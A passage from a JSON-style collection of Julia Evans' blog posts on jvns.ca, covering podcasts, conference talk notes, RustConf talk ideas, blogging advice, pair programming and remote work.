think this is not a big deal, and in fact for a lot of people that might not be a big deal.\n \n \n\nBut I write programs that do things millions or billions of times, and I want\nthose things to be really highly reliable, so even relatively rare events are\nimportant to me. So I love tracing tools and log files that can tell me\n**everything** about when a certain function is called. This makes it a lot easier to debug than just having a general statistical distribution!   This is a great  post about tracing tools  by Dan Luu.\n \n\n\n \n\n \n"},
{"url": "https://jvns.ca/blog/2018/03/05/codenewbie-networking-podcast/", "title": "How does the internet work? podcast", "content": "\n      I’m on the CodeNewbie podcast this week talking about  how the Internet works  –\nwe talked about TCP, UDP, netcat, and a few other things. CodeNewbie is a podcast for people who are\njust getting started with programming. I was excited about doing this podcast because I feel like\noften people don’t learn about things like computer networking for a long time (I didn’t learn\nanything about how TCP worked until I’d been programming for 10 years!) but I think a lot of\nsystems-y concepts are both really interesting and pretty approachable. \n\n I feel like there’s a certain segment of people who get into programming partly because they just\nwant to know how things  work  (what is my computer DOING when I get a website?!?). Obviously I am\na little like this, and I have a special love for networking because it’s EVERYWHERE and I find it\nvery satisfying to know how it works. So I wanted to introduce a little bit of that to some\nbeginning programmers. \n\n I tried to keep it pretty introductory – if you’re interested in knowing how the internet works but\nare unclear on what “TCP” is, maybe this will help a little! I thought Saron did a fantastic job of\nasking questions throughout. \n\n a few relevant links: \n\n \n computer networking zine I wrote  Networking!  ACK!  has similar goals :) \n tcpdump zine \n how to send a file to your friend on a local network with netcat \n how traceroute works \n Networking for System Administrators  (the only\nbook about computer networking I’ve ever read. I liked it a lot and it helped me learn) \n \n\n"},
{"url": "https://jvns.ca/blog/2018/04/16/rbspy-talk/", "title": "Talk: Building a Ruby profiler", "content": "\n      \n\n.container {\n    display: flex;\n    margin-bottom: 5px;\n}\n.slide {\n    width: 50%;\n}\n.content {\n    width: 50%;\n    align-items: center;\n    padding: 20px;\n}\n\n@media (max-width: 480px) { /*breakpoint*/\n    .container {\n        display: block;\n    }\n    .slide {\n        width: 100%;\n    }\n    .content {\n        width: 100%;\n}\n\n \n\n Last month I gave a talk at Localhost, the  Recurse Center ’s monthly talk\nseries. My favourite thing about Localhost’s talk format is that speakers\ngive relatively in depth talks about technical topics, and then people ask  lots  of questions at\nthe end. \n\n This talk is about the core of rbspy – how do we read memory out of the Ruby interpreter to figure\nout what function a Ruby process is running? How do we do that in a way that works across multiple\nRuby versions? Do we need to stop the Ruby process to figure out what function is running? \n\n The talk is 30 minutes and it’s followed by about 30 minutes of questions. The audio is a bit\nsketchy in places. Here’s the video: \n\n \n\n"},
{"url": "https://jvns.ca/blog/2018/03/24/rustconf-talks/", "title": "Talks I'd love to see at RustConf", "content": "\n     \n\n I’m on the RustConf program committee this year, so here is a quick list of ideas for talks I’d be\ninterested in seeing submitted.  These are things I personally think are interesting – I certainly\ndon’t represent the program committee as a whole, and there are lots of very important topics that\nI’ve left out :) \n\n There’s an overarching theme here which is “talks that help people become better systems\nprogrammers” – my main interest in Rust is that it lets me to do systems programming, which I\ncouldn’t really do before! So I’d love to see talks that help the audience level up as a systems\nprogrammer a little bit. \n\n Submit a proposal here! . The deadline is April 13,\n2018 – in just over 2 weeks! The earlier you submit the better – if you submit early, the program\ncommittee can give you feedback on your proposal :) \n\n Here are my ideas for you: \n\n introduce a small part of the Rust compiler \n\n I imagine a lot of Rust developers have never read any of the code in the Rust compiler (I\nhaven’t!). And I know the language is trying to bring in more contributors! So I think an awesome\ntalk could be: \n\n \n pick a small part of the Rust compiler (maybe a part you’ve contributed to!) \n explain how it works! \n briefly talk about opportunities for contributing to Rust RFCs today that involve that part of the compiler! \n \n\n explain how a popular Rust library works! \n\n Is there a Rust library you love and that has made really interesting/unusual implementation choices? Explain what those choices are! What’s the secret sauce that makes that library interesting? I’m personally especially interested in talks about libraries by folks other than the primary maintainer (maybe you’re not the primary maintainer, but it’s a library you really love and have contributed to a little bit!) \n\n explain an important systems concept using Rust \n\n Did you write a database? Some high-performance networking code? I’d love to see talks that dive\ninto specific important systems concepts and that explain both how the systems thing works in\ngeneral (what’s an L2 cache?) and how to use that thing in your Rust programs specifically (how do\nyou write cache-efficient code in Rust? what’s an example of a crate that does that well?) \n\n A few ideas for systems concepts to tackle: \n\n \n filesystems (so many  weird things can happen with file systems !!) \n databases! How do they work? What’s hard about writing a database? \n a deep dive on threads: what do you have to be careful of when using Unix threads? What’s\nsurprising about them? Do you need to do anything special to make a threaded application portable? \n profilers! What are the best tools to use to improve your Rust performance! \n \n\n C interop & cross-platform code \n\n interoperating with C code and writing cross-platform code are super important but I feel like I\nhaven’t seen that many resources about how to work with C libraries effectively in Rust. I feel like\nit’s very easy to write sketchy Rust bindings for a C library and I’d love to see some best\npractices here! \n\n Two talks I’d love to see: \n\n \n a guide to best practices/common mistakes writing cross-platform Rust code. \n a guide to wrapping a C library in Rust, maybe using an example of some existing Rust C bindings\nthat are exceptionally well implemented. \n \n\n lessons from C/C++ code \n\n As someone who isn’t that familiar with C/C++ development, I’d LOVE to have someone give an overview\nof some of the architecture choices behind a large, high-quality C/C++ codebase. How is it designed?\nWhat can we learn about structuring complex Rust programs from looking at how complex C/C++ programs\nwork? \n\n emerging Rust programming patterns \n\n I feel like since Rust is so new, we’re still learning what works and what doesn’t when writing Rust\ncode. Are there a few specific things you’ve seen work well across a wide variety of Rust codebases?\nWhat’s a pattern that works well in other programming languages but often turns out not to work that\nwell in Rust? \n\n One really simple example of this is – when I started writing Rust this year, I got the advice to\nmake my structs own all of their data, and then almost always make my functions take references to\nstructs.  Obviously that’s not a strict rule, but I’ve found following it most of the times makes my\ncode a lot easier. \n\n give a talk even if you aren’t the most experienced Rust programmer! \n\n Often people think that you need to be a wizard expert to give a talk at a programming conference.\nThis isn’t true! What I’ve seen is that often people who are at an intermediate level give extremely\nuseful talks, because they remember what it was like to learn the material for the first time and so\ncan explain it well. \n\n I think quite a few of these talks could be done well by someone who isn’t an extremely experienced\nRust programmer. I’d love to hear from: \n\n \n people who have done a lot of systems programming in other languages but are relatively new to\nRust \n people who are doing systems programming for the first time in Rust (what have you learned so far\nthat really helped you?) \n and of course people who aren’t really involved in systems programming at all and are using Rust\nfor other reasons!! (what are you doing with Rust? :D) \n \n\n"},
{"url": "https://jvns.ca/blog/2014/07/17/ruby-rogues/", "title": "Ruby Rogues podcast: systems programming tricks!", "content": "\n      If you listen to the\n Ruby Rogues podcast \nthis week, you will find me! We talked about using systems programming\ntools (like strace) to debug your regular pedestrian code, building an\noperating system in Rust, but also other things I didn’t expect, like\nhow asking stupid questions is an amazing way to learn. \n\n Ruby Rogues also has a transcript of the entire episode, an index, and\nlinks to everything anyone referenced during the episode, including\napparently 13 posts from this blog (!). I don’t even understand how\nthis is possible, but apparently it is! It was a fun time, and\napparently it is totally okay to spend a Ruby podcast discussing Rust,\nstatistics, strace, and, well… not Ruby :) \n\n"},
{"url": "https://jvns.ca/blog/2021/05/24/blog-about-what-you-ve-struggled-with/", "title": "Blog about what you've struggled with", "content": "\n     \n\n I was talking to  Jemma  recently about what stops people\nfrom blogging. One barrier that stood out to me was: it’s hard to identify\nwhich things you know will be useful to other people! \n\n The process I use for a lot of my blog posts is: \n\n \n Struggle with something (usually computer-related) \n Eventually (days or months or years later), figure out how to solve some of\nthe problems I had \n Write a blog post about what helped me \n \n\n I think this approach is effective because if I struggled with something,\nthere’s a pretty good chance that other people are struggling with it too, and\nwhat I learned is likely to be useful to at least some of them! \n\n Obviously this isn’t the only approach to blogging, but it’s my approach, so\nthat’s what I’m going to write about here :). I’ll give a few examples of\nspecific blog posts that came out of something I struggled with. \n\n it’s not about the struggle, it’s about what you learned \n\n The first important thing here is that the blog posts aren’t about the\nstruggle, exactly. I’m still not that great at writing Rust, but I wouldn’t\nwrite a blog post called “I find Rust hard” – that wouldn’t help anyone! \n\n Instead, when I learn something that helps me, I write about it so that it can\nhelp other people too. For example, one specific thing I struggled with in Rust\nwas understanding references, and so I wrote  what’s a reference in\nRust?  about what I learned. \n\n what you struggled with shows you what to focus on \n\n Okay, Julia, you might be thinking – if it’s about what you learned, why isn’t\nthis blog post called “Blog about what you learned” then? Well, we’ve all\nlearned lots of things! For example at some point in the last 8 years I learned\nGo. But what’s worth talking about with Go? Should I explain the syntax? Talk\nabout  net/http ? Explain Go modules? \n\n If I instead think about what I’ve struggled with Go, it suddenly gets MUCH\nclearer – one thing I’ve had trouble with is deadlocks! That’s way more\nspecific, and a lot more likely to be useful to other people than an intro\nto Go modules – it’s not obvious how to use Go’s concurrency features well! \n\n it can take years to figure out what you learned \n\n When I started my first job at a “big” company 7 years ago (“big” being more\nthan 5 people), I really didn’t understand how to work with my manager\neffectively and it sometimes caused misunderstandings. It wasn’t great! \n\n But when I was first having problems with this, I didn’t have anything that\nuseful to say about this other than “oh no, um, this is hard”. This was because\nI hadn’t solved my problems for myself yet, so I definitely could not tell\nanyone else what I learned! It took me a few years to figure out how to work\nwith a manager well. \n\n And I’m still figuring out new ways to explain what I learned – for example just a few\nmonths ago I realized (while talking to my old manager) that there are a lot of\nconcrete facts that managers don’t know, and if you think your manager  does \nknow those facts, you’ll end up with a lot of miscommunications and problems. \n\n So I wrote  Things your manager might not\nknow  as another\nattempt at helping people who are learning to work with their manager\neffectively. I wrote that post a year and a half after I left my job, so I\ndidn’t even have a manager at the time! \n\n write it down while you still remember what was hard \n\n It’s very easy to misidentify what you learned if you don’t remember what it\nwas like to struggle with the topic. \n\n When I first started using git at work, it was confusing and I made\na lot of mistakes. But that was in 2011 and I can’t remember what was hard\nabout it anymore! So I could say that the most important thing to learn to\nsolve your git issues is git’s object model (like how branches / commits work),\nbut I don’t exactly know if that’s true! I know that I used to struggle with\ngit, and now I don’t, and now I have a pretty good model of how git’s object\nworks, but I don’t really remember exactly what got me from there to here. \n\n advanced mode: write about other people’s struggles \n\n But if you don’t remember what was hard about something, not all is lost! It’s\ndefinitely possible to write about a topic that somebody else is struggling\nwith. I find that the easiest way to do this is to first teach the topic, so\nhere’s a quick story about that. \n\n In 2019, I wrote a zine about SQL. When I started, I thought it would be easy\nbecause I was pretty comfortable with SQL – I’d done a LOT of data analysis in\nSQL and so I thought I could explain it. \n\n But I couldn’t have been more wrong. It turned out that when I started I had no\nidea what was actually challenging about learning SQL. \n\n I spent a lot of time talking to a friend who was new to SQL about how it\nworked, and we realized that one of the blockers was that it wasn’t obvious to\nthem in what order a given SQL query was running. So I wrote  SQL queries don’t\nstart with\nSELECT ,\nand a bunch of related examples and that helped a lot of people understand SQL\nqueries better! \n\n The cool thing about this is that when I dig into something that I think is\neasy but someone else is struggling with, often I learn something new too. For\nexample I did sort of know in what order SQL queries ran but I’d never really\nthought about it explicitly. And being more explicit about how it worked helped\nme understand window functions better, which was something I was a bit shaky\non! \n\n sometimes you just haven’t learned enough about a topic yet (and that’s ok) \n\n There are still a lot of programming and career things that I’ve struggled with\nin the past where  I still don’t have a concrete lesson that I can write about.\nFor example, I’ve struggled a lot with Kubernetes and Envoy and I’ve written\nabout that a bit on this blog, but I’m still not sure what I learned from some\nof the problems I had. And I don’t work with either of them anymore so it’s\npossible I’ll never really be able to say! This kind of feels bad, but it’s\nokay. \n\n Every so often I’ll think about a topic I’ve struggled with in the past and\nreflect on whether I’ve learned anything I can write about. Usually the answer\nis no, but sometimes the answer is yes! \n\n it’s a bit weird to be vulnerable on the internet \n\n Talking about things I struggled with on the internet is kind of scary\nsometimes! Here are a few things I do to make it less scary: \n\n \n Mostly talk about technical problems! Talking about computer problems I had\n( “I didn’t understand how groups worked on\nLinux” ) feels very neutral to me.\nWe’re not born learning how groups work on Linux and everyone has to learn it\nat some point. \n Be a little vague when talking about people problems! For example,  get your\nwork recognized: write a brag document \ncomes out of some stress I had around getting promoted. I’m not very specific\nabout my problems because everyone’s experience with getting promoted is\nsuper different and I think focusing too much on my specific issues would\ndistract from the lesson (“track your accomplishments!”). \n Spend a lot of time processing things! In general the more I struggled with\nsomething, the more time I need to spend processing it before I can figure\nout how to talk about what I learned from it in public. \n Don’t talk about everything! There are obviously lots of things I never talk\nabout on my blog at all :) \n \n\n I wrote another blog post about  blogging principles I use  a few years ago that talks about some more tactics I use here. \n\n you can practice identifying what you learned \n\n Going from “I have a problem!” to “I don’t have that problem anymore!” to “here\nare the specific things I learned!” is not actually that easy! But it is\nsomething you can practice. It’s easy to skip that last step – you can\nlearn things on an intuitive level but never actually identify what exactly it\nwas that you learned. \n\n For example, I’m definitely better at testing than I used to be but I haven’t\ntaken the time to identify exactly what I’ve learned about testing over the\nyears! I think I’d write better tests if I explicitly wrote down what I’ve\nlearned about testing so that I could more consistently do those things in the\nfuture. \n\n talk to a friend or coworker to figure out what you’ve learned \n\n It can be really hard to notice things you’ve learned on your own. Like we just\ntalked about, I don’t really know what I’ve learned about testing! \n\n I find that having conversations with friends or coworkers makes it MUCH easier\nto figure out what I want to write about a topic. A few reasons talking to\nothers is great: \n\n \n It can help clarify your thoughts! \n They probably have different ideas from you! \n They can tell you if what you’re saying resonates with them or not! \n \n\n why I like writing about what I learned in public \n\n I think that whether or not you write about what you learned in public, it’s\nsuper valuable to keep track of what you learned from doing hard things. It\nhelps you remember what you’ve learned so that you can do better work in the\nfuture! \n\n Here are a few things I like about writing about what I’ve learned in public,\nthough: \n\n \n It helps other people! It feels way better to have struggled with a super\nconfusing situation and come out of it with something concrete that can help\nothers navigate a similar situation \n Putting the writing on the internet really forces me to think about whether\nthe lessons I think I learned actually make sense (“wait, is this REALLY\ntrue?“) \n When I’m writing I often come up with additional questions and do a little\nbit of extra research, so I learn even more! \n Seeing other people’s reactions often helps me learn something new \n If I want to remember what I learned about something in the past, I can just\nlook it up on my blog! \n \n\n Thanks to Jemma, Kamal, Shae, Matthieu, and Travis for feedback on a\ndraft of this.  \n\n"},
{"url": "https://jvns.ca/blog/2016/01/14/a-few-notes-on-my-cusec-talk/", "title": "A few notes on my CUSEC talk", "content": "\n     \n\n I gave a talk today! If you came, thanks for coming! Here are some notes and links if you’d like to learn more! \n\n on debugging \n\n \n on Linux, learn strace. It’s the best. I wrote  a zine about it  that you can download and print. I also wrote a  a million blog posts about it . \n on OS X, learn dtrace. It’s even better than strace.  This post  has a great introduction \n the 40ms networking bug I talked about fixing \n ngrep is a fun tool for network analysis \n If you need to analyze encrypted traffic, use  mitmproxy \n wireshark  gives you a really nice graphical interface for network spying. It’s fun. \n How I got better at debugging \n for more tools:  a few spy tools for your operating system (other than strace) \n \n\n on computers being fast \n\n \n play the game:  computers-are-fast.github.io \n visualvm comes with Java, and it’s a good first step ( a screenshot of it ) \n A millisecond isn’t fast \n YourKit is a great profiler for Java, but not free \n for stories of performance debugging, see  Nancy Drew and the case of the Slow Program \n perf is cool for C++, and I wrote  a blog post about it \n the video of Brendan Gregg yelling at a hard drive . his website is also fantastic:  brendangregg.com/ \n \n\n"},
{"url": "https://jvns.ca/blog/2016/05/21/a-few-notes-from-my-pydata-berlin-keynote/", "title": "Notes from my PyData Berlin keynote", "content": "\n      I did one of the keynotes at PyData Berlin yesterday, called “How to trick a neural network”. I spent the first while talking about tricking neural networks, and then we talked about how having black box models can be dangerous, and a few strategies for making black box models more interpretable. There’s a ton of interesting work there, and here are a few links: \n\n \n if you want to understand exactly how we tricked a neural network,  Breaking Linear Classifiers on ImageNet  uses exactly the same technique, but on a simpler linear classifier instead of on a neural network. In general Andrej Karpathy’s blog is great. \n the blog post I wrote about how to trick a neural network \n the original paper I read called “Explaining and Harnessing Adversarial Examples” . This paper is pretty short and I found it easy to read. \n \n\n some fun art projects that generate images with neural networks: \n\n \n deep dream \n A Neural Algorithm of Artistic Style  and the corresponding website  deepart.io . Someone told me that the “artistic style” paper is actually super readable and interesting! \n \n\n In general, I became more convinced at this conference that sometimes people do really cool things (like training a machine learning model to play space invaders), and those things are actually possible to reproduce for yourself if you read the paper and invest a bunch of time! I think it can often take like 2 months to fully read and understand the paper and get it to work, but it’s not impossible, which is cool. \n\n We talked about how machine learning sometimes doesn’t work or can have unintended effects. I mentioned \n\n \n Carina Zona: Consequences of an insightful algorithm \n this paper by Google on building reliable production machine learning systems is great  Machine Learning: the high interest credit card of technical debt \n \n\n Here are a few methods to get more interpretability out of black box machine learning models: \n\n \n this paper called  A Model Explanation System  has some really good ideas and is very short. We’ve used some of these ideas at work and it’s been helpful so far. \n someone linked me to this other model explanation system called  LIME  which I haven’t looked at yet \n a  package for scikit-learn  that produces more interpretable results (the “Bayesian rule list” classifier) \n \n\n This problem of how to make a complicated machine learning model more interpretable definitely isn’t solved, and I’d love to have more conversations about it. If you have other useful links you think I should include, let me know! \n\n  thanks to Piotr Migdal & Thomas Friedel for sending me links!  \n\n"},
{"url": "https://jvns.ca/blog/2014/06/06/working-remote/", "title": "Working remote, 3 months in", "content": "\n      I’ve been working remotely for  Stripe  for 3\nmonths now. \n\n I decided to do this because I interviewed at this place, and the\npeople were thoughtful and friendly and interesting and knew things\nthat I did not know! But they were all in San Francisco, and I didn’t\nwant to move there at all. They convinced me that if I worked remote\nit might not be a disaster. \n\n \n\n I was still pretty scared about working remote, though! So far it’s\nbeen hard, but I’m learning how to do it better. I’m somewhat\nextroverted, so it’s possible for me to go a bit stir-crazy sitting\nalone by myself all day. \n\n I live on the east coast. The people I work with are mostly in San\nFrancisco, three time zones away. So when I start work it’s usually\naround 6am in SF. \n\n Let’s start with some things I have trouble with: \n\n Hard things \n\n \n Timezones are hard. If I start working at 8, there aren’t many\npeople I can talk to BECAUSE IT’S 5AM. (however: it’s a really good\ntime to focus! And I can be a wizard and finish tasks before\neveryone wakes up in the morning!) \n I don’t know how to meet new people without visiting the physical\noffice. A lot of people are just names on IRC to me. I do not know\nof any upside to this, or how to fix it. \n I’m worried about the winter. \n I didn’t realize how much I depended on synchronous communication\n(talking face-to-face!) to do things until it was taken away from\nme. This is thankfully getting easier. \n It seems pretty difficult for me to know very much about the office\nculture. \n I find building consensus about technical decisions hard to do\nremotely. (see: depending on synchronous communication) \n A/V is hard. I often don’t try to participate in talks because I\ndon’t expect the experience to be good. \n \n\n Good things: \n\n \n I get to work with people who I like and live where I want to live.\nAnd I’m learning a lot. This is why I decided to do this in the\nfirst place =) \n I can work in my backyard in the sun. \n I have more flexibility about when and where to work. I appreciate\nthis more than I thought I would. \n Thinking about working remote as “a cool possibility with some ups\nand downs” instead of “this enemy that means I HAVE TO SEE LESS\nPEOPLE OH NO” helps me be happy instead of grumpy. \n My happiness seems to be proportional to the amount of time I spend\ntalking to people. This is something I can measure and optimize! \n I’m getting better at asynchronous communication. \n If I ask someone to do something when I finish work, they’ll be\nworking for 3 hours after me! It might be already done when I start\nthe next day. \n 2 people on my team are remote!\n( colin  and\n avi ). This is a huge deal. If I\nwere the only one it would probably be a disaster and I would be way\nmore sad. As far as I can tell Avi’s been working remote\napproximately forever and he has a lot of good things to say. \n I like that Stripe actually changes things to accommodate remotes\n(for instance: the all-hands meeting switched times so that it’s not\nat 7:30pm on Friday on the east coast) \n Basically all of the discussion on my team happens over IRC/email.\nThis means that there is a lot of IRC to keep up with. This is\nharder than I expected. \n \n\n Strategies \n\n \n I changed my work computer’s clock to be the time in San Francisco.\nThis helps more than I expected. \n I made a short URL ( http://go/julia ) that links to a Google Hangout\nwith me \n Deciding to be happy this summer. There is no reason to be sad in\nthe summer. \n Talking to other people who work remote sometimes and learning about\nthings they do! \n \n\n That’s all! Maybe there will be further updates. \n"},
{"url": "https://jvns.ca/blog/2014/03/01/pair-programming/", "title": "Pair programming", "content": "\n      So I started at  Stripe  this week. I did a lot\nof pair programming at  Hacker School , and I\nfound it super productive. As of right now, there’s no culture of pair\nprogramming at Stripe. However, Stripe is a place full of delightful\npeople who are willing to try new things. So this past week I’ve found\nmyself explaining why I find pairing productive. \n\n I think some people are confused about what pair programming means.\nIt’s pretty simple! Two humans sit down in front of the same computer,\nwith one keyboard, and work on a Thing together. The Thing is often\nprogramming, but you can also pair on other things, like writing\ndocumentation! \n\n Here’s a way to think about it. When you’re programming, you might ask\nsomeone to come over to your computer and talk about some code with\nyou. Or a bug, or a design issue you’re trying to work out. Pair\nprogramming is like that, but for longer (like an hour). \n\n \n\n A few things I like about pairing: \n\n \n You can timebox your pairing sessions, and have a specific goal:\n“We’re going to work for 1 hour on refactoring this library”. \n Explaining your code to someone makes you understand it better. \n Pairing on a boring task makes it way more fun. If you have a\ngnarly bug that you don’t want to fix, work on it with someone new\nto the codebase! They’ll learn something, and you’ll have company. \n Pairing is a good way to share knowledge. I get a lot of incidental\nlearning out of pairing with people, seeing things they do that are\nnew to me, and asking them questions. \n It keeps you honest. You can’t just stop coding and go look at cats\nwhen you’re pairing. (You actually can, but you both have to agree\nto go look at cats together.) \n \n\n It’s definitely possible to have pairing sessions that go badly, of\ncourse. Hacker School’s\n excellent advice on pairing \nsuggests \n\n \n It’s good to make sure you have similar (or at least compatible)\ngoals before you start pairing. If one person thinks the goal is to\nlearn Python, and the other thinks the goal is to fix a bug as\nquickly as possible, you can run into friction. \n \n\n Basically I think pair programming is a fun time, I usually end up\nwriting better code than I would have on my own, and I learn a lot.\nSome people like Pivotal Labs pair like 8 hours a day, but you don’t\nhave to do that! Pairing a little bit is a super fun thing. \n"},
{"url": "https://jvns.ca/blog/2018/08/11/a-few-recent-podcasts/", "title": "A few recent podcasts", "content": "\n      In the last few months I was on a few podcasts. Maybe you will like them! \n\n \n Software Engineering Daily , talking about rbspy and how to use a profiler \n FLOSS weekly , again about rbspy. They told me\nI’m the guest that asked  them  the most questions, which I took as a compliment :) \n Hanselminutes with Scott Hanselman  on writing zines / teaching / learning \n CodeNewbie  on computer networking\n& how the Internet works (from March) \n \n\n I find podcasts a little scary – my main medium is blogging/writing, which lets me edit it out when\nI say something in a confusing way. Can’t do that as well on a podcast! They seem to have turned out\nokay anyway, and I think practicing talking extemporaneously on a subject is useful :) \n\n One surprising-to-me thing about podcasts was that podcasters all care a lot about what recording\nequipment you use, which makes sense! It turns out that sound quality is important. \n\n I had fun doing all of these – podcasts are WAY easier to organize than talks (no travel!) and now\nI have a fancy podcasting microphone. And that means I can record more things in the future if I\nwant. I have this dream of making fun animated videos but that probably won’t happen any time soon. \n\n"},
{"url": "https://jvns.ca/blog/2014/03/29/reports-from-remote-land-remote-pairing-works-great/", "title": "Reports from remote-land: remote pairing works great!", "content": "\n      I’ve been working remote for 2 weeks now. The things that have surprised\nme the most are \n\n \n I’m less lonely and disconnected than I expected (it turns out I’m\nan extrovert…) \n how well remote pairing works! \n \n\n I did a lot of pair programming while at\n Hacker School  and I found it to be a\nreally productive way to work. When I got a remote job (I live in\nMontreal and work with people mostly in SF), I thought it would be\nimpossible to do pairing, or at the very least it would be a terrible\nexperience. \n\n This is not so! Here’s what I’ve been using: \n\n \n\n \n tmate  for sharing my terminal (I use vim in the\nterminal). The other person only needs a ssh client to use tmate. \n Google Hangouts or Skype for talking, and sometimes for\nscreensharing \n an internal alias  http://go/julia  that redirects to a Google\nhangout to make it extra easy to talk to me \n a lot of scheduling pairing dates with Google calendar \n \n\n My experience so far with Google Hangouts / Skype is that neither one\nis really better, and both of them sometimes don’t work. I tried\n appear.in  once and that didn’t work  at all . One\nperson’s sound and video was 2 minutes behind the entire time. \n\n tmate mostly works beautifully. Sometimes it will work perfectly and\nit’s amazing and sometimes it will freeze for me 5 times in an hour.\nI’m not sure if it doesn’t like inconsistent internet connections or\nwhat. The other problem with tmate is that some people have security\nconcerns with it, so I’m thinking of making an internal tmate that\ngoes through our servers. \n\n I’ve also been using screensharing to remote pair. Screensharing is\ngreat because it means you can use any editor you want (not just a\nterminal editor), you can use more than one window, and nobody needs\nany special software. Both Skype and Google Hangouts have it and\nthey’re both a little wonky. A lot of people have retina Macbooks\nand their screen resolution is way higher than mine, so I have to ask\nthem to zoom in a lot. The bigger you make the text, the less you’ll\nhave trouble when the internet connection wavers. \n\n If you’re screensharing, be proactive about asking your partner to\nzoom in :) \n\n The worst thing about remote pairing is that it’s really disruptive to\nthe flow of the pairing session when your internet connection keeps\ndropping or if one of your tools freezes, and that never happens with\nin-person pairing. \n\n As long as the technology works, though, remote pairing has been\ngreat! I find that it feels just as productive than in-person pairing,\nwhich surprised me a lot. The only thing I wish for is an extra\nscreen so I could see my pairing-partner’s face at the same time. \n\n Are you doing remote pairing? I’d love ideas of how to mitigate any of\nthe problems I’m having :) I’m  @bork  on\nTwitter. \n"},
{"url": "https://jvns.ca/blog/2015/12/31/surviving-meetings-while-remote/", "title": "Surviving meetings while remote", "content": "\n     \n\n I work remote. This means that in most of the meetings I’m in, I’m a remote participant. If you’re in an organization that has a lot of remotes, maybe this will be useful to you! There are two scenarios I want to talk about: \n\n \n Every person in the meeting is in a different location (100% remote) \n There are 6 people in the meeting (5 local, 1 remote) \n \n\n Scenario #1 is great! Everyone has the same connection problems. \n\n Scenario #2 is a disaster. It took me a long time to understand why, but I think the primary reason is that it’s very hard to interrupt and indicate that I want to speak when I’m remote. You can’t indicate it visually as easily, so if I just wait for a break in the conversation to say something… well, it will never happen :) \n\n Also, sometimes people can’t hear me, and I’ve had this exchange a lot \n\n \n other people: stuff \n me: minor remark \n other people: what? we didn’t catch that \n me: never mind. \n \n\n I’ve gotten way better at being remote in meetings and interrupting. Now if I have something to say I just say “HI I HAVE A THING TO SAY”. And people say “yes julia?” and then I say the thing. It feels awkward but it works for me. But it took me a really long time to learn how to interrupt! Recently I was in a meeting with 8 local people and me and I said more than 5 things! I am now a remote meetings wizard. \n\n It’s also hard to tell when a remote person is  done  speaking. I sometimes explicitly say “that’s all I have” or something at the end. So my interactions are awkwardly delimited by HI I HAVE A THING TO SAY – I AM SAYING THE THING - I AM DONE SPEAKING NOW YOU MAY PROCEED. This is great and it works. \n\n local people can help \n\n I once ran a meeting with 6 remotes and 6 local people, where I was local. Normally, this means that the local people do all the talking and the remotes are totally silent (because the barrier to entry is high). To combat this a little, I frequently asked the remotes if they had anything to say (Dan, I know you care a lot about this. What do you think?), and they frequently did have something really interesting to say! They were just not saying it. \n\n"},
{"url": "https://jvns.ca/blog/2014/10/22/working-remote-8-months-in/", "title": "Working remote, 8 months in (seeing humans is important!)", "content": "\n      I wrote up what it was like to be working remote\n 3 months after I started .\n5 months later, I have some new thoughts! \n\n The worst thing about working remotely so far has just been feeling\ngenerally alienated. I talked a little about motivation in\n Don’t feel guilty about not contributing to open source ,\nwhere I mentioned a theory that motivation is made up of\n competence  (I know how to do this!),  autonomy  (I can make my\nown decisions!), and  relatedness  (I know why I’m doing this!). \n\n It turns out that a) this is called\n self-determination theory ,\nand b) I totally misunderstood what “relatedness” meant. It turns out\nthat relatedness is actually about feeling connected to the people\nabout you (“the universal want to interact, be connected to, and\nexperience caring for others”). It’s the opposite of feeling alienated\n:) \n\n I didn’t visit the office for 4 months and that was a mistake! Turns\nout that if I don’t see a group of people for way too long then it’s\neasy to feel like nobody cares about me and everything I do is\nterrible, and it has all kinds of strange negative unforeseen\nconsequences. Visiting SF for a while made everything approximately\n100x better. In gifs (of course) seeing people can be the difference\nbetween: \n\n \n\n and \n\n \n\n Right now I feel a lot more like gif #2, which is pretty great. \n\n \n\n Visiting the office lets me \n\n \n meet new people who have joined since I last visited \n remember how much I like so many of the people I work with (wow hi\nwow we work in the same place wow you’re really great wow) \n have super productive in-person meetings \n have all the lunches and coffees and walks \n just generally feel like a human that other humans know about and\nlike (are people happy to see me? HOW CAN IT BE WOW) \n \n\n Some new disconnected thoughts: \n\n \n When I started, being in a different timezone (EST vs PST) was hard\nbecause I would get stuck on things in the morning. Being in a\ndifferent timezone now basically doesn’t matter at all. It means I\nhave some uninterrupted time to work in the morning, and then can\ntalk to people as they trickle in in the afternoon \n My team is super easy to communicate with via IM. This is basically\nthe best. \n 6 people are working remote right now (up from 3), which is pretty\ngreat. And 3 of them are in my timezone! \n It’s basically impossible to learn about how the office ‘feels’\nwhile remote. Working from SF feels totally different from working\nfrom my house. This is okay, but it’s always surprising to me how\ndifferent it is when I’m there. \n Jobs just get easier after doing them for a while. Now I know more\nthings so lots of things are easier and better. \n People have suggested all kinds of remote work routines to me. Some\nof these are helpful to me, and some of them aren’t! \n as with anything, finding things that work is just trial and error.\nLots of error :) \n \n\n New strategies: \n\n \n having a bunch of 1:1 weekly meetings with people I’m working with\nis really great. It means I get to talk to them without having a\nscheduled agenda which is hard to do sometimes. I want to make a few\nmore of these! \n visit SF often enough \n leave the house every day, and shower every morning :) :) :) :). I\nhave an Extremely Patient Partner who walks me to a cafe in the\nmornings to get me out of the house, which is the greatest. \n \n\n Overall I really like the people I work with and the things I work on\nand am happy that I get to work with them without having to move to\nSan Francisco. Yay! \n"},
{"url": "https://jvns.ca/blog/2018/02/18/working-remotely--4-years-in/", "title": "Working remotely, 4 years in", "content": "\n     \n\n I live in Montreal. 4 years ago, I decided to take a job working remotely for a company based in San\nFrancisco. At the time, I was worried that it wouldn’t work out – I’d never worked remotely before,\nso it was a pretty big unknown for me. You can see me struggling with it on this blog after  3 months  and  8 months . But\n Avi  (one of the people who interviewed me, who works remotely)\nconvinced me that it was a reasonable thing to try, and I could see that it was working for him, and\nI  really  liked all the people who interviewed me, so I decided to give it a shot. \n\n It worked out. It obviously hasn’t always been 100% perfect in every way, but working remotely has\nbeen a great career move for me. I’ve learned a ton from my coworkers and have been able to do some\nreally cool projects that I’m proud of. So here are some thoughts about what I think has made it\nwork for me. \n\n As usual this isn’t advice, and I’m not saying that you should work remotely. I’ve only done remote\nwork at one company (Stripe) and I am only one person (even other remotes at Stripe will have\ndifferent experiences than me!). \n\n What’s scary about working remote? \n\n When I started writing this post, I  tweeted : \n\n \n been working remote for almost 4 years now and was thinking about writing a post about it. what\nwould be useful to say? \n \n\n I got a really overwhelming response – more than a hundred people replied to that tweet with\nquestions! In this post I’m going to try to answer some of those questions. \n\n I’d venture that the reason people are so curious is that working remote is a big, scary leap, 